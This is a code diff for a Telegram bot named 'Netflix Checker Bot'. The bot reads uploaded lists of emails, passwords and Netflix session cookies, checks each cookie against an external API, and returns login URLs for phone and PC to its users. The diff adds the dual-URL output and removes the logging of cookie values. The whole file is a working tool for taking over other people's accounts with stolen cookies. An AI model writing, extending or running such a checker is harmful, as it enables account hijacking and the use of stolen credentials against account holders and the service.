@@ -188,17 +188,17 @@ def extract_netflix_id_from_cookie(cookie_text):
         netflix_id = match.group(1).strip()
         netflix_id = netflix_id.split('&')[0].split('|')[0].strip()
         if netflix_id:
-            logger.info(f"Extracted Netflix ID from NetflixId= format: {netflix_id[:50]}...")
+            logger.info(f"Extracted Netflix ID from NetflixId= format")
             return netflix_id
     
     # Pattern 2: ct%3D format (most common)
     match = re.search(r'(ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
     if match:
         netflix_id = match.group(1).strip()
-        logger.info(f"Extracted Netflix ID from ct%3D format: {netflix_id[:50]}...")
+        logger.info(f"Extracted Netflix ID from ct%3D format")
         return netflix_id
     
-    # Pattern 3: Any URL encoded string that looks like a Netflix cookie
+    # Pattern 3: Any URL encoded string
     if '%3D' in cookie_text and len(cookie_text) > 50:
         # Try to get the whole thing if it's a cookie
         if '&' in cookie_text:
@@ -206,22 +206,15 @@ def extract_netflix_id_from_cookie(cookie_text):
             for part in parts:
                 if 'ct%3D' in part or 'NetflixId' in part:
                     return part.strip()
-        logger.info(f"Using full text as Netflix ID: {cookie_text[:50]}...")
+        logger.info(f"Using full text as Netflix ID")
         return cookie_text
     
-    # Pattern 4: If it contains v%3D3 and ct%3D
-    match = re.search(r'(v%3D3%26ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
-    if match:
-        netflix_id = match.group(1).strip()
-        logger.info(f"Extracted Netflix ID from v%3D3%26ct%3D format: {netflix_id[:50]}...")
-        return netflix_id
-    
-    # If nothing matches, return the original (maybe it's already the ID)
+    # If nothing matches, return the original
     if len(cookie_text) > 20:
-        logger.info(f"Using original text as Netflix ID: {cookie_text[:50]}...")
+        logger.info(f"Using original text as Netflix ID")
         return cookie_text
     
-    logger.warning(f"Could not extract Netflix ID from: {cookie_text[:100]}")
+    logger.warning(f"Could not extract Netflix ID")
     return None
 
 # ==================== ENHANCED FORMAT PARSER ====================
@@ -254,7 +247,7 @@ def parse_account_line(line):
         # Parse additional metadata if present (format: | Country=US | Plan=Premium)
         if '|' in line:
             parts = line.split('|')
-            for part in parts[1:]:  # Skip the first part which contains email/cookie
+            for part in parts[1:]:
                 part = part.strip()
                 if '=' in part:
                     key, value = part.split('=', 1)
@@ -280,7 +273,7 @@ def parse_account_line(line):
                         account['plan'] = value
         
         if 'netflix_id' not in account:
-            logger.warning(f"No Netflix ID found in line: {line[:100]}")
+            logger.warning(f"No Netflix ID found in line")
             return None
         
         # Set default email if not found
@@ -288,17 +281,16 @@ def parse_account_line(line):
             account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
             account['password'] = "••••••••"
         
-        logger.info(f"Successfully parsed account: Email={account['email']}")
         return account
         
     except Exception as e:
         logger.error(f"Error parsing line: {e}")
         return None
 
-# ==================== FIXED API FUNCTIONS ====================
+# ==================== API FUNCTIONS WITH BOTH URLS ====================
 
 async def check_with_your_api(netflix_id, email="unknown@email.com"):
-    """Check Netflix ID using YOUR API"""
+    """Check Netflix ID using YOUR API - Returns both Phone and PC URLs"""
     
     if not netflix_id:
         return {
@@ -320,15 +312,12 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
         
         response = requests.post(url, json=data, timeout=15)
         
-        # Log raw response for debugging
-        logger.info(f"📡 Response Status: {response.status_code}")
-        
-        # Try to parse JSON
+        # Parse JSON response
         try:
             result = response.json()
-            logger.info(f"📡 Response: {json.dumps(result, indent=2)[:500]}")
+            logger.info(f"📡 API Response received")
         except:
-            logger.error(f"Failed to parse JSON response: {response.text[:500]}")
+            logger.error(f"Failed to parse JSON response")
             return {
                 "success": False,
                 "error": "Invalid API response format",
@@ -336,23 +325,50 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
                 "email": email
             }
         
-        # Check for success in different formats
+        # Check for success
         if result.get('success') == True:
-            # Try to find URLs
-            login_url = result.get('login_url') or result.get('url') or result.get('link')
-            phone_url = result.get('phone_url') or result.get('mobile_url') or result.get('phone_link')
+            # Try to find both URLs
+            # Phone URL could be in different field names
+            phone_url = (result.get('phone_url') or 
+                        result.get('mobile_url') or 
+                        result.get('phone_link') or
+                        result.get('unsupported_url'))
             
-            if login_url:
-                logger.info(f"✅ Valid account found! Login URL: {login_url[:100]}")
+            # PC URL could be in different field names
+            pc_url = (result.get('login_url') or 
+                     result.get('url') or 
+                     result.get('link') or
+                     result.get('account_url'))
+            
+            # If we only have one URL, try to determine which one it is
+            if phone_url and not pc_url:
+                # If the URL contains 'unsupported', it's likely the phone URL
+                if 'unsupported' in phone_url:
+                    pc_url = phone_url  # Use same for both if only one available
+                else:
+                    pc_url = phone_url
+                    phone_url = None
+            elif pc_url and not phone_url:
+                phone_url = pc_url  # Use same for both
+            
+            if pc_url:
+                logger.info(f"✅ Valid account found! Phone URL: {phone_url[:50] if phone_url else 'N/A'}... PC URL: {pc_url[:50]}...")
                 return {
                     "success": True,
-                    "login_url": login_url,
                     "phone_url": phone_url,
+                    "pc_url": pc_url,
+                    "email": email
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": "No login URL generated",
+                    "error_code": "MISSING_URL",
                     "email": email
                 }
         
         # Check for error
-        error_msg = result.get('error') or result.get('message') or result.get('status') or 'Invalid or expired'
+        error_msg = result.get('error') or result.get('message') or 'Invalid or expired'
         
         return {
             "success": False,
@@ -379,12 +395,7 @@ async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
     
-    keyboard = [
-        [
-            InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
-        ]
-    ]
-    
+    keyboard = [[InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en')]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
@@ -519,11 +530,11 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ==================== FIXED CHECK COMMAND ====================
+# ==================== UPDATED CHECK COMMAND WITH BOTH URLS ====================
 
 @authorized_only
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check a single Netflix ID"""
+    """Check a single Netflix ID - Shows both Phone and PC URLs"""
     user_id = update.effective_user.id
     
     global total_checks, valid_accounts, invalid_accounts
@@ -578,8 +589,10 @@ Example:
         valid_accounts += 1
         
         short_id = netflix_id[:30] + "..." if len(netflix_id) > 30 else netflix_id
-        login_url = result['login_url']
+        phone_url = result.get('phone_url')
+        pc_url = result.get('pc_url')
         
+        # Format the success message with both URLs like the example
         success_msg = f"""
 ╔══════════════════════════════════════╗
 ║     ✅ **NETFLIX ACCOUNT** ✅        ║
@@ -588,22 +601,26 @@ Example:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔑 **Code:** `{short_id}`
 
-🔗 **Login URL:**
-`{login_url}`
+📱 **Phone Login URL:**
+`{phone_url}`
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👇 Click the button below to open
+💻 **PC Login URL:**
+`{pc_url}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✨ {YOUR_CREDIT} ✨
         """
         
-        # Fix: Make sure the button text is correct
-        keyboard = [[InlineKeyboardButton("🎬 OPEN NETFLIX", url=login_url)]]
+        # Create separate buttons for phone and PC
+        keyboard = []
+        if phone_url:
+            keyboard.append([InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)])
+        if pc_url:
+            keyboard.append([InlineKeyboardButton("💻 OPEN ON PC", url=pc_url)])
         
         await update.message.reply_text(
             success_msg,
-            reply_markup=InlineKeyboardMarkup(keyboard),
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
             parse_mode='Markdown',
             disable_web_page_preview=True
         )
@@ -633,11 +650,11 @@ Example:
         
         await update.message.reply_text(error_msg, parse_mode='Markdown')
 
-# ==================== FILE HANDLER ====================
+# ==================== UPDATED FILE HANDLER WITH BOTH URLS ====================
 
 @authorized_only
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded .txt files"""
+    """Handle uploaded .txt files - Shows both Phone and PC URLs"""
     user_id = update.effective_user.id
     
     global total_checks, valid_accounts, invalid_accounts
@@ -709,6 +726,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     details.append(f"📺 {account['plan']}")
                 
                 details_str = ' | '.join(details) if details else ''
+                phone_url = result.get('phone_url')
+                pc_url = result.get('pc_url')
                 
                 valid_msg = f"""
 ╔══════════════════════════════════════╗
@@ -719,18 +738,26 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📧 **Email:** `{account.get('email', 'N/A')}`
 {details_str}
 
-🔗 **Login URL:**
-`{result['login_url']}`
+📱 **Phone Login URL:**
+`{phone_url}`
+
+💻 **PC Login URL:**
+`{pc_url}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👇 Click the button below to open
+✨ {YOUR_CREDIT} ✨
                 """
                 
-                keyboard = [[InlineKeyboardButton("🎬 OPEN NETFLIX", url=result['login_url'])]]
+                # Create separate buttons for phone and PC
+                keyboard = []
+                if phone_url:
+                    keyboard.append([InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)])
+                if pc_url:
+                    keyboard.append([InlineKeyboardButton("💻 OPEN ON PC", url=pc_url)])
                 
                 await update.message.reply_text(
                     valid_msg,
-                    reply_markup=InlineKeyboardMarkup(keyboard),
+                    reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
                     parse_mode='Markdown',
                     disable_web_page_preview=True
                 )
@@ -796,10 +823,11 @@ def check_rate_limit(user_id, limit=5, period=60):
 async def run_bot():
     """Run the bot"""
     print("=" * 50)
-    print("🎬 NETFLIX CHECKER BOT")
+    print("🎬 NETFLIX CHECKER BOT WITH MOBILE SUPPORT")
     print("=" * 50)
     print(f"✅ Authorized Users: {len(AUTHORIZED_USERS)}")
     print(f"✅ Credit: {YOUR_CREDIT}")
+    print(f"✅ Mobile Support: Enabled (Shows both Phone and PC URLs)")
     print("=" * 50)
     
     clear_telegram_webhook()
@@ -826,7 +854,7 @@ async def run_bot():
         allowed_updates=['message', 'callback_query']
     )
     
-    print("✅ Bot is running!")
+    print("✅ Bot is running with Mobile Support!")
     print("=" * 50)
     
     try:
